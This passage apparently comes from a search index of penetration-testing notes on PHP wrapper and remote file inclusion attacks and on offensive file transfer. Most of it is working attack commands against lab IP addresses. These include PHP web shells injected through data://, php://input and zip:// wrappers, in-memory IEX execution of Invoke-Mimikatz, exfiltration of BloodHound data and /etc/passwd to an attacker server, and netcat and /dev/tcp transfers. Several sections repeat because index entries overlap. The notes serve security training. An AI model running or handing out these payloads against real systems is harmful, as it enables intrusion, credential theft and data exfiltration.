URL-encoded in the request http://134.209.184.216:30489/index.php?language=zip://malicious.zip% 23exec.php & cmd = id # is encoded to %23 to prevent the browser from recognizing it as a fragment.","title":"PHP Wrappers"},{"location":"file_inclusion/other_php_wrappers/#expect-wrapper","text":"The expect wrapper in PHP helps in interaction with process streams. This extension is disabled by default but can prove very useful if enabled. For example, the following URL will return the output of the id command. http://blog.inlanefreight.com/index.php?language=expect://id","title":"Expect Wrapper"},{"location":"file_inclusion/other_php_wrappers/#data-wrapper","text":"The data wrapper can be used to include external data, even PHP code. It's possible to use this only if the allow_url_include setting is enabled in the PHP configuration. This can be found in the file /etc/php/X.Y/apache2/php.ini for Apache and in /etc/php/X.Y/fpm/php.ini for php-fpm used by Nginx, where X.Y is your install PHP version. First, base64 encode a PHP web shell hrmns@htb[/htb]$ echo '<?php system($_GET[' cmd ']); ?>' | base64 PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pgo= Then include it using the data wrapper http://blog.inlanefreight.com/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pgo=&cmd=id http://134.209.184.216:30084/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pgo=&cmd=id","title":"Data Wrapper"},{"location":"file_inclusion/other_php_wrappers/#input-wrapper","text":"The input wrapper can be used to include external input and execute code. It also needs the allow_url_include setting enabled. The following curl command sends a POST request with a system command and then includes it using php://input , which gets executed by the page hrmns@htb[/htb]$ curl -s -X POST --data \"<?php system('id'); ?>\" \"http://134.209.184.216:30084/index.php?language=php://input\" | grep uid uid=33(www-data) gid=33(www-data) groups=33(www-data)","title":"Input Wrapper"},{"location":"file_inclusion/other_php_wrappers/#zip-wrapper","text":"The zip wrapper can prove useful in combination with file uploads. If the website allows uploading arbitrary files, an attacker can upload a malicious zip file and include PHP code. This wrapper isn't enabled by default and can be installed with the command below: hrmns@htb[/htb]$ apt install phpX.Y-zip hrmns@htb[/htb]$ echo '<?php system($_GET[' cmd ']); ?>' > exec.php hrmns@htb[/htb]$ zip malicious.zip exec.php hrmns@htb[/htb]$ rm exec.php Copy malicious.zip to the webroot to simulate the upload. The files in the zip archive can be referenced using the # symbol, which should be URL-encoded in the request http://134.209.184.216:30489/index.php?language=zip://malicious.zip% 23exec.php & cmd = id # is encoded to %23 to prevent the browser from recognizing it as a fragment.","title":"Zip Wrapper"},{"location":"file_inclusion/remote_file_inclusion/","text":"Remote File Inclusion or RFI occurs when a website allows the inclusion of remotely hosted files. The impact of this vulnerability can be low or high, depending on the server's configuration. To include a remote file in PHP, the allow_url_fopen setting (enabled by default) and allow_url_include setting have to be turned on. The server tried including the file at http://localhost:8080/file but failed. Looking at the HTTP server, a request was logged hrmns@htb[/htb]$ python3 -m http.server 8080 Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/ ) 127.0.0.1 - - [03/Jan/2020 07:15:50] code 404, message File not found 127.0.0.1 - - [03/Jan/2020 07:15:50] \"GET /file HTTP/1.0\" 404 - Try including a web shell from our server and executing commands. First, create a file named shell.php with the following contents: <?php system($_GET['cmd']); ?> The file was included, and we executed id successfully. In case the server appends the .php extension automatically, we can omit the .php at the end. Even the FTP protocol can be used to access remote files. Python's pyftpdlib library can be used to test this locally. hrmns@htb[/htb]$ python -m pyftpdlib -p 21 [I 2020-01-03 07:36:00] >>> starting FTP server on 0.0.0.0:21, pid=23686 <<< [I 2020-01-03 07:36:00] concurrency model: async [I 2020-01-03 07:36:00] masquerade (NAT) address: None [I 2020-01-03 07:36:00] passive ports: None Use the ftp:// scheme to access shell.php present in the FTP root By default, PHP tries to authenticate as an anonymous user. If the server needs authentication, then the credentials can be specified http://blog.inlanefreight.com/index.php?language=ftp://user:pass@localhost/shell.php&cmd=id Windows \u00b6 When the application is running on Windows, the restrictions applied by allow_url_include can be bypassed by using the SMB protocol. This is because Windows treats files on remote SMB servers as normal files, which can be referenced directly with a UNC path. We can spin up an SMB server using Impacket's smbserver.py, which allows anonymous authentication by default. hrmns@htb[/htb]$ smbserver.py -smb2support share $( pwd ) Impacket v0.9.22.dev1+20200520.120526.3f1e7ddd - Copyright 2020 SecureAuth Corporation [*] Config file parsed [*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0 [*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0 [*] Config file parsed [*] Config file parsed [*] Config file parsed execute shell.php as follows:","title":"RFI"},{"location":"file_inclusion/remote_file_inclusion/#windows","text":"When the application is running on Windows, the restrictions applied by allow_url_include can be bypassed by using the SMB protocol. This is because Windows treats files on remote SMB servers as normal files, which can be referenced directly with a UNC path. We can spin up an SMB server using Impacket's smbserver.py, which allows anonymous authentication by default. hrmns@htb[/htb]$ smbserver.py -smb2support share $( pwd ) Impacket v0.9.22.dev1+20200520.120526.3f1e7ddd - Copyright 2020 SecureAuth Corporation [*] Config file parsed [*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0 [*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0 [*] Config file parsed [*] Config file parsed [*] Config file parsed execute shell.php as follows:","title":"Windows"},{"location":"file_transfers/methods/","text":"Windows File Transfer Methods \u00b6 Powershell Downloads \u00b6 In any version of PowerShell , the System.Net.WebClient class can be used to download a file over HTTP . PS C:\\htb> (New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1',\"C:\\Users\\Public\\Downloads\\PowerView.ps1\") From PowerShell 3.0, Invoke-WebRequest is also available, but it is noticeably slower at downloading files. The aliases iwr , curl , and wget can be used instead of Invoke-WebRequest. PS C:\\htb> Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1 Instead of downloading to disk, the payload can instead be executed in memory, using Invoke-Expression, or the alias iex . PS C:\\htb> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') IEX also accepts pipeline input. PS C:\\htb> Invoke-WebRequest https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1 | iex There may be cases when the Internet Explorer first-launch configuration has not been completed, which prevents the download. This can be bypassed using the parameter - UseBasicParsing . PS C:\\htb> Invoke-WebRequest https://<ip>/PowerView.ps1 | iex Invoke-WebRequest : The response content cannot be parsed because the Internet Explorer engine is not available, or Internet Explorer's first-launch configuration is not complete. Specify the UseBasicParsing parameter and try again. At line:1 char:1 + Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/P ... + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ + CategoryInfo : NotImplemented: (:) [Invoke-WebRequest], NotSupportedException + FullyQualifiedErrorId : WebCmdletIEDomNotSupportedException,Microsoft.PowerShell.Commands.InvokeWebRequestCommand PS C:\\htb> Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | iex PS C:\\htb> Invoke-CheckLocalAdminAccess ComputerName IsAdmin ------------ ------- localhost False With administrative access to the machine, we can disable Internet Explorer\u2019s First Run customization. C:\\htb> reg add \"HKLM\\SOFTWARE\\Microsoft\\Internet Explorer\\Main\" /f /v DisableFirstRunCustomize /t REG_DWORD /d 2 Powershell File Uploads \u00b6 PS C:\\htb> $b64 = [System.convert]::ToBase64String((Get-Content -Path 'c:/users/public/downloads/BloodHound.zip' -Encoding Byte)) PS C:\\htb> Invoke-WebRequest -Uri http://10.10.10.32:443 -Method POST -Body $b64 After catching the base64 data with Netcat, the payload can be decoded. hrmns@htb[/htb]$ echo <base64> | base64 -d -w 0 > bloodhound.zip Bitsadmin \u00b6 The Background Intelligent Transfer Service (BITS) can download files from HTTP sites and SMB shares. PS C:\\htb> bitsadmin /transfer n http://10.10.10.32/nc.exe C:\\Temp\\nc.exe Download PS C:\\htb> Import-Module bitstransfer;Start-BitsTransfer -Source \"http://10.10.10.32/nc.exe\" -Destination \"C:\\Temp\\nc.exe\" Upload PS C:\\htb> Start-BitsTransfer \"C:\\Temp\\bloodhound.zip\" -Destination \"http://10.10.10.132/uploads/bloodhound.zip\" -TransferType Upload -ProxyUsage Override -ProxyList PROXY01:8080 -ProxyCredential INLANEFREIGHT\\svc-sql Certutil \u00b6 Essentially serving as Wget for Windows. Antimalware Scan Interface (AMSI) currently detects this as malicious certutil usage. C:\\htb> certutil.exe -verifyctl -split -f http://10.10.10.32/nc.exe Linux File Transfer Methods \u00b6 Wget / cURL \u00b6 hrmns@htb[/htb]$ wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh hrmns@htb[/htb]$ curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh OpenSSL \u00b6 OpenSSL can be used to send files \"nc style.\" Create certificate hrmns@htb[/htb]$ openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem Stand up server hrmns@htb[/htb]$ openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh Download file hrmns@htb[/htb]$ openssl s_client -connect 10 .10.10.32:80 -quiet > LinEnum.sh Bash (/dev/tcp) \u00b6 There may also be situations where no obvious file transfer tools are available. In this case, as long as bash version 2.04 or greater is installed (compiled with --enable-net-redirections), the built-in /dev/tcp device file can be used for simple file downloads. Connect to Target's Webserver hrmns@htb[/htb]$ exec 3 <>/dev/tcp/10.10.10.32/80 HTTP GET Request hrmns@htb[/htb]$ echo -e \"GET /LinEnum.sh HTTP/1.1\\n\\n\" > & 3 Print Response hrmns@htb[/htb]$ cat < & 3 PHP \u00b6 PHP is also very prevalent and provides multiple file tranfer methods File_get_contents() hrmns@htb[/htb]$ php -r '$file = file_get_contents(\"https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh\"); file_put_contents(\"LinEnum.sh\",$file);' Fopen() hrmns@htb[/htb]$ php -r 'const BUFFER = 1024; $fremote = fopen(\"https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh\", \"rb\"); $flocal = fopen(\"LinEnum.sh\", \"wb\"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);' If the php-curl module has been installed, this can alternatively be used. Php-curl hrmns@htb[/htb]$ php -r '$rfile = \"https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh\"; $lfile = \"LinEnum.sh\"; $fp = fopen($lfile, \"w+\"); $ch = curl_init($rfile); curl_setopt($ch, CURLOPT_FILE, $fp); curl_setopt($ch, CURLOPT_TIMEOUT, 20); curl_exec($ch);' It is also possible to retrieve each line as an array and pipe the output to bash. hrmns@htb[/htb]$ php -r '$lines = @file(\"https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh\"); foreach ($lines as $line_num => $line) { echo $line; }' | bash Python \u00b6 Python is often present on Linux and can be used to download files when Wget and cURL are not available. Although Python isn\u2019t currently installed by default in Windows, typing Python in a command prompt opens the Windows Store's official distribution with a single-click install. Python is frequently installed on developer and IT computers and is bundled by default with major business financial applications such as Bloomberg (Bloomberg Professional Services). Python2 hrmns@htb[/htb]$ python2 import urllib urllib . urlretrieve ( \"https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh\" , \"LinEnum.sh\" ) Python 3 hrmns@htb[/htb]$ python3 import urllib.request urllib . request . urlretrieve ( \"https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh\" , \"LinEnum.sh\" ) Other Languages \u00b6 Ruby hrmns @htb [ /htb]$ ruby -e 'require \"net/ http \"; File.write(\" LinEnum . sh \", Net::HTTP.get(URI.parse(\" https : // raw . githubusercontent . com / rebootuser / LinEnum / master / LinEnum . sh \")))' Perl hrmns @htb [ /htb]$ perl -e 'use LWP::Simple; getstore(\"https://raw.githubusercontent.com/ rebootuser /LinEnum/m aster / LinEnum . sh \", \" LinEnum . sh \" ); ' Go package main import ( \"os\" \"io\" \"net/http\" ) func main () { lfile , err := os . Create ( \"LinEnum.sh\" ) _ = err defer lfile . Close () rfile := \"https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh\" response , err := http . Get ( rfile ) defer response . Body . Close () io . Copy ( lfile , response . Body ) } Catching Files over HTTP/SMB \u00b6 Nginx Enable PUT \u00b6 When allowing HTTP Uploads, it is critical to be 100% positive users cannot upload web shells and then execute it. Apache makes it easy to shoot ourselves in the foot with this, as the PHP Module loves to execute anything ending in PHP . Configuring NGINX to use PHP is nowhere near as simple. Create a directory to handle uploaded files hrmns@htb[/htb]$ sudo mkdir -p /var/www/uploads/SecretUploadDirectory Change the owner to www-data hrmns@htb[/htb]$ sudo chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory Create the NGINX Configuration file, by creating the file /etc/nginx/sites-available/upload.conf with the contents: server { listen 9001; location /SecretUploadDirectory/ { root /var/www/uploads; dav_methods PUT; } } Symlink our site to the sites-enabled directory hrmns@htb[/htb]$ sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/ Start nginx hrmns@htb[/htb]$ sudo systemctl restart nginx.service If we get any error messages, be sure to check /var/log/nginx/error.log root@localhost# tail -2 ` /var/log/nginx/error.log ` 2020/11/17 16:11:56 [emerg] 5679#5679: bind() to 0.0.0.0:`80` failed (98: A`ddress already in use`) 2020/11/17 16:11:56 [emerg] 5679#5679: still could not bind() root@localhost# : ss -lnpt | grep ` 80 ` LISTEN 0 100 0.0.0.0:80 0.0.0.0:* users:((\"python\",pid=`2811`,fd=3),(\"python\",pid=2070,fd=3),(\"python\",pid=1968,fd=3),(\"python\",pid=1856,fd=3)) root@localhost# : ps -ef | grep ` 2811 ` user65 2811 1856 0 16:05 ? 00:00:04 `python -m websockify 80 localhost:5901 -D` root 6720 2226 0 16:14 pts/0 00:00:00 grep --color=auto 2811 6. We see there is already a module listening on port 80. To get around this, we can remove the default NGINX Configuration which binds on port 80. hrmns@htb[/htb]$ sudo rm /etc/nginx/sites-enabled/default Test upload by using cURL to send a PUT request. In the below example, we will upload the /etc/passwd file to the server and call it users.txt root@localhost# curl -T /etc/passwd http://localhost:9001/SecretUploadDirectory/users.txt root@localhost# tail -1 /var/www/upload/SecretUploadDirectory/users.txt user65:x:1000:1000:,,,:/home/user65:/bin/bash Once we have this working, a good test is to make sure \"File Listings\" is not available by navigating to \"http://localhost/SecretUploadDirectory\". By default, with Apache, if we hit a directory without an index file (index.html), it will list all the files. This is bad for our use case of exfilling files because most of the files are sensitive by nature, and we want to do our best to hide them. Thanks to NGINX being minimal, features like that are not enabled by default. SMB \u00b6 Impacket SMBServer \u00b6 Impacket is my preferred method of setting up a file transfer over SMB because it does not run in the background or involve modifying configuration files. We can use smbserver.py specifically. If other people attempt to connect to the service, it has the bonus that it will display a NetNTLMv2 hash that, if successfully cracked, will reveal the password. Impacket SMBServer - Syntax hrmns@htb[/htb]$ /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support <share name> <location> Always to have a separate order for file transfers to prevent unauthorized persons from gaining access to our local data. If we would use our home directory to transfer the desired data and an unauthorized person accesses it, he will be able to navigate to the \".ssh\" directory and find the SSH keys, which can be used against us. hrmns@htb[/htb]$ mkdir Transfers && cd Transfers hrmns@htb[/htb]$ /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support FileTransfer $( pwd ) To verify the share was created and accessible, we can run: hrmns@htb[/htb]$ sudo smbclient -L 127 .0.0.1 Enter WORKGROUP\\root's password: Sharename Type Comment --------- ---- ------- IPC$ Disk FileTransfer Disk SMB1 disabled -- no workgroup available Going to our Impacket terminal, we can see the connection and if we had not known the user's password before. We could use the line under \"Authenticated Successfully\" to Hashcat and attempt to crack it. Impacket SMBServer - Listening [*] Config file parsed [*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0 [*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0 [*] Config file parsed [*] Config file parsed [*] Config file parsed [*] Incoming connection (127.0.0.1,38928) [*] AUTHENTICATE_MESSAGE (WORKGROUP\\root,PARROT) [*] User PARROT\\root authenticated successfully [*] root::WORKGROUP:4141414141414141:926ebbd136be706117721fbcad821410:01010000000000008039147afabcd601a3099ada8208fd2c00000000010010004a006e00640046006700460075007000030010004a006e0064004600670046007500700002001000640062005a0054005300490054004b0004001000640062005a0054005300490054004b00070008008039147afabcd6010600040002000000080030003000000000000000000000000000000054af210c79b6f4bd986d404d7769e730cecdf6b2feec6c6d5cd8a765d98034bb0a0010000000000000000000000000000000000009001c0063006900660073002f003100320037002e0030002e0030002e00310000000000 [*] Connecting Share(1:IPC$) [*] NetrShareEnum Level: 1 [*] Disconnecting Share(1:IPC$) [*] Closing down connection (127.0.0.1,38928) [*] Remaining connections [] In some cases, computers will not allow anonymous SMB connections. In this case, we may want to use the user/password flags to allow authentication on our SMB server. This can be done with the following command: hrmns@htb[/htb]$ /usr/share/doc/python3-impacket/examples/smbserver.py -user USERNAME -password PASSWORD FileTransfer $( pwd ) Miscellaneous File Transfer Methods \u00b6 Web Servers \u00b6 A compromised Linux machine may not have a web server installed or access to the Internet, so a mini web server can be used. What they perhaps lack in security, they make up for in flexibility, as the webroot location and listening ports can quickly be changed. Python2 hrmns@htb[/htb]$ python -m SimpleHTTPServer 8080 Python3 hrmns@htb[/htb]$ python3 -m http.server 8080 Ruby hrmns@htb[/htb]$ ruby -run -ehttpd . -p8080 PHP hrmns@htb[/htb]$ php -S 0 .0.0.0:8080 Socat hrmns@htb[/htb]$ socat TCP-LISTEN:8080,reuseaddr,fork With administrative access to a Windows machine, IIS can be easily installed. PS C:\\htb> Add-WindowsFeature Web-Server, Web-Mgmt-Tools SMB / WebDAV \u00b6 SMB is a good option for file transfers, as on Windows as you don\u2019t need to install anything. SMB traffic features prominently on networks, and SMB file transfers to Windows computers are expected. Unfortunately, it\u2019s also the case that outbound SMB traffic is often allowed through the external firewall. In case SMB traffic through the firewall has been restricted, WebDAV may be a good option, as it relies on HTTP as a transport protocol. Some common tools that support file transfers from SMB and WebDAV shares are reviewed below. PowerShell \u00b6 Copy-Item PS C:\\htb> Copy-Item -Path C:\\Temp\\nc.exe -Destination C:\\Temp\\nc.exe -ToSession $session Set-Content PS C:\\htb> $file = Get-Content C:\\Temp\\nc.exe -Raw PS C:\\htb> Invoke-Command -ComputerName 10.10.10.132 -ScriptBlock {Set-Content -Path C:\\Temp\\nc.exe -value $using:file} Copy / xcopy / robocopy PS C:\\htb> xcopy \\\\10.10.10.132\\share\\nc.exe nc.exe PS C:\\htb> copy C:\\Temp\\nc.exe \\\\10.10.10.132\\c$\\Temp\\nc.exe Map / Mount Drives PS C:\\htb> net use Q: \\\\10.10.10.132\\share PS C:\\htb> pushd \\\\10.10.10.132\\share PS C:\\htb> mklink /D share \\\\10.10.10.132\\share hrmns@htb[/htb]$ smbclient //10.10.10.132/share -U username -W domain Netcat \u00b6 The target or attacking machine can be used to initiate the connection, which is useful if a firewall prevents access to the target. Connection Initiated by Pentester victim@target:~$ nc -nlvp 8000 > mimikatz.exe hrmns@htb[/htb]$ nc -nv 10 .10.10.132 8000 <mimikatz.exe Connection Initiated by Target hrmns@htb[/htb]$ nc -nv 10 .10.10.32 8000 > mimikatz.exe victim@target:~$ nc -nlvp 8000 <mimikatz.exe Netcat can also serve content for transfer by the /dev/tcp device file. Start nc listener hrmns@htb[/htb]$ nc -lvnp 80 <LinEnum.sh Dl the file victim@target:~$ cat < /dev/tcp/10.10.10.32/80 > LinEnum.sh SCP \u00b6 SCP Upload PS C:\\htb> scp C:\\Temp\\bloodhound.zip user@10.10.10.150:/tmp/bloodhound.zip SCP Download hrmns@htb[/htb]$ scp user@target:/tmp/mimikatz.exe C: \\T emp \\m imikatz.exe FTP \u00b6 Windows 10 includes a native FTP client, which can also read commands from a script to work in a non-interactive shell. Ftp-script.txt open 10.10.10.32 anonymous anonymous lcd C:\\Temp get nc.exe quit PS C:\\htb> ftp -s:ftp-script.txt TFTP \u00b6 The TFTP client is not available by default in Windows, but it can be enabled using DISM. \\ PS C:\\htb> DISM /online /Enable-Feature /FeatureName:TFTP In newer versions of Windows, the Install-WindowsFeature PowerShell cmdlet can also be used. Both DISM and Install-WindowsFeature require administrative access. PS C:\\htb> Install-WindowsFeature TFTP-Client RDP \u00b6 emote Desktop is often enabled on Windows machines, and from Linux, rdesktop can be used to expose a local folder in the remote RDP session. hrmns@htb[/htb]$ rdesktop 10 .10.10.132 -r disk:linux = '/home/user/rdesktop/files' Alternatively, from Windows, the native mstsc.exe remote desktop client can be used. After selecting the drive, we can interact with it in the remote session PS C:\\htb> copy \\\\tsclient\\c\\temp\\mimikatz.exe . This drive is not accessible to any other users logged on to the target computer, even if they manage to hijack the RDP session.","title":"Methods"},{"location":"file_transfers/methods/#windows-file-transfer-methods","text":"","title":"Windows File Transfer Methods"},{"location":"file_transfers/methods/#powershell-downloads","text":"In any version of PowerShell , the System.Net.WebClient class can be used to download a file over HTTP . PS C:\\htb> (New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1',\"C:\\Users\\Public\\Downloads\\PowerView.ps1\") From PowerShell 3.0, Invoke-WebRequest is also available, but it is noticeably slower at downloading files. The aliases iwr , curl , and wget can be used instead of Invoke-WebRequest. PS C:\\htb> Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1 Instead of downloading to disk, the payload can instead be executed in memory, using Invoke-Expression, or the alias iex . PS C:\\htb> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') IEX also accepts pipeline input. PS C:\\htb> Invoke-WebRequest https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1 | iex There may be cases when the Internet Explorer first-launch configuration has not been completed, which prevents the download. This can be bypassed using the parameter - UseBasicParsing . PS C:\\htb> Invoke-WebRequest https://<ip>/PowerView.ps1 | iex Invoke-WebRequest : The response content cannot be parsed because the Internet Explorer engine is not available, or Internet Explorer's first-launch configuration is not complete. Specify the UseBasicParsing parameter and try again. At line:1 char:1 + Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/P ... + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ + CategoryInfo : NotImplemented: (:) [Invoke-WebRequest], NotSupportedException + FullyQualifiedErrorId : WebCmdletIEDomNotSupportedException,Microsoft.PowerShell.Commands.InvokeWebRequestCommand PS C:\\htb> Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | iex PS C:\\htb> Invoke-CheckLocalAdminAccess ComputerName IsAdmin ------------ ------- localhost False With administrative access to the machine, we can disable Internet Explorer\u2019s First Run customization. C:\\htb> reg add \"HKLM\\SOFTWARE\\Microsoft\\Internet Explorer\\Main\" /f /v DisableFirstRunCustomize /t REG_DWORD /d 2","title":"Powershell Downloads"},{"location":"file_transfers/methods/#powershell-file-uploads","text":"PS C:\\htb> $b64 = [System.convert]::ToBase64String((Get-Content -Path 'c:/users/public/downloads/BloodHound.zip' -Encoding Byte)) PS C:\\htb> Invoke-WebRequest -Uri http://10.10.10.32:443 -Method POST -Body $b64 After catching the base64 data with Netcat, the payload can be decoded. hrmns@htb[/htb]$ echo <base64> | base64 -d -w 0 > bloodhound.zip","title":"Powershell File Uploads"},{"location":"file_transfers/methods/#bitsadmin","text":"The Background Intelligent Transfer Service (BITS) can download files from HTTP sites and SMB shares. PS C:\\htb> bitsadmin /transfer n http://10.10.10.32/nc.exe C:\\Temp\\nc.exe Download PS C:\\htb> Import-Module bitstransfer;Start-BitsTransfer -Source \"http://10.10.10.32/nc.exe\" -Destination \"C:\\Temp\\nc.exe\" Upload PS C:\\htb> Start-BitsTransfer \"C:\\Temp\\bloodhound.zip\" -Destination \"http://10.10.10.132/uploads/bloodhound.zip\" -TransferType Upload -ProxyUsage Override -ProxyList PROXY01:8080 -ProxyCredential INLANEFREIGHT\\svc-sql","title":"Bitsadmin"},{"location":"file_transfers/methods/#certutil","text":"Essentially serving as Wget for Windows. Antimalware Scan Interface (AMSI) currently detects this as malicious certutil usage. C:\\htb> certutil.exe -verifyctl -split -f http://10.10.10.32/nc.exe","title":"Certutil"},{"location":"file_transfers/methods/#linux-file-transfer-methods","text":"","title":"Linux File Transfer Methods"},{"location":"file_transfers/methods/#wget-curl","text":"hrmns@htb[/htb]$ wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh hrmns@htb[/htb]$ curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh","title":"Wget / cURL"},{"location":"file_transfers/methods/#openssl","text":"OpenSSL can be used to send files \"nc style.\" Create certificate hrmns@htb[/htb]$ openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem Stand up server hrmns@htb[/htb]$ openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh Download file hrmns@htb[/htb]$ openssl s_client -connect 10 .10.10.32:80 -quiet > LinEnum.sh","title":"OpenSSL"},{"location":"file_transfers/methods/#bash-devtcp","text":"There may also be situations where no obvious file transfer tools are available. In this case, as long as bash version 2.04 or greater is installed (compiled with --enable-net-redirections), the built-in /dev/tcp device file can be used for simple file downloads. Connect to Target's Webserver hrmns@htb[/htb]$ exec 3 <>/dev/tcp/10.10.10.32/80 HTTP GET Request hrmns@htb[/htb]$ echo -e \"GET /LinEnum.sh HTTP/1.1\\n\\n\" > & 3 Print Response hrmns@htb[/htb]$ cat < & 3","title":"Bash (/dev/tcp)"},{"location":"file_transfers/methods/#php","text":"PHP is also very prevalent and provides multiple file tranfer methods File_get_contents() hrmns@htb[/htb]$ php -r '$file = file_get_contents(\"https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh\"); file_put_contents(\"LinEnum.sh\",$file);' Fopen() hrmns@htb[/htb]$ php -r 'const BUFFER = 1024; $fremote = fopen(\"https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh\", \"rb\"); $flocal = fopen(\"LinEnum.sh\", \"wb\"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);' If the php-curl module has been installed, this can alternatively be used. Php-curl hrmns@htb[/htb]$ php -r '$rfile = \"https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh\"; $lfile = \"LinEnum.sh\"; $fp = fopen($lfile, \"w+\"); $ch = curl_init($rfile); curl_setopt($ch, CURLOPT_FILE, $fp); curl_setopt($ch, CURLOPT_TIMEOUT, 20); curl_exec($ch);' It is also possible to retrieve each line as an array and pipe the output to bash. hrmns@htb[/htb]$ php -r '$lines = @file(\"https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh\"); foreach ($lines as $line_num => $line) { echo $line; }' | bash","title":"PHP"},{"location":"file_transfers/methods/#python","text":"Python is often present on Linux and can be used to download files when Wget and cURL are not available. Although Python isn\u2019t currently installed by default in Windows, typing Python in a command prompt opens the Windows Store's official distribution with a single-click install. Python is frequently installed on developer and IT computers and is bundled by default with major business financial applications such as Bloomberg (Bloomberg Professional Services). Python2 hrmns@htb[/htb]$ python2 import urllib urllib . urlretrieve ( \"https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh\" , \"LinEnum.sh\" ) Python 3 hrmns@htb[/htb]$ python3 import urllib.request urllib . request . urlretrieve ( \"https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh\" , \"LinEnum.sh\" )","title":"Python"},{"location":"file_transfers/methods/#other-languages","text":"Ruby hrmns @htb [ /htb]$ ruby -e 'require \"net/ http \"; File.write(\" LinEnum . sh \", Net::HTTP.get(URI.parse(\" https : // raw . githubusercontent . com / rebootuser / LinEnum / master / LinEnum . sh \")))' Perl hrmns @htb [ /htb]$ perl -e 'use LWP::Simple; getstore(\"https://raw.githubusercontent.com/ rebootuser /LinEnum/m aster / LinEnum . sh \", \" LinEnum . sh \" ); ' Go package main import ( \"os\" \"io\" \"net/http\" ) func main () { lfile , err := os . Create ( \"LinEnum.sh\" ) _ = err defer lfile . Close () rfile := \"https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh\" response , err := http . Get ( rfile ) defer response . Body . Close () io . Copy ( lfile , response . Body ) }","title":"Other Languages"},{"location":"file_transfers/methods/#catching-files-over-httpsmb","text":"","title":"Catching Files over HTTP/SMB"},{"location":"file_transfers/methods/#nginx-enable-put","text":"When allowing HTTP Uploads, it is critical to be 100% positive users cannot upload web shells and then execute it. Apache makes it easy to shoot ourselves in the foot with this, as the PHP Module loves to execute anything ending in PHP . Configuring NGINX to use PHP is nowhere near as simple. Create a directory to handle uploaded files hrmns@htb[/htb]$ sudo mkdir -p /var/www/uploads/SecretUploadDirectory Change the owner to www-data hrmns@htb[/htb]$ sudo chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory Create the NGINX Configuration file, by creating the file /etc/nginx/sites-available/upload.conf with the contents: server { listen 9001; location /SecretUploadDirectory/ { root /var/www/uploads; dav_methods PUT; } } Symlink our site to the sites-enabled directory hrmns@htb[/htb]$ sudo ln -s /etc/nginx/sites-available/upload.conf 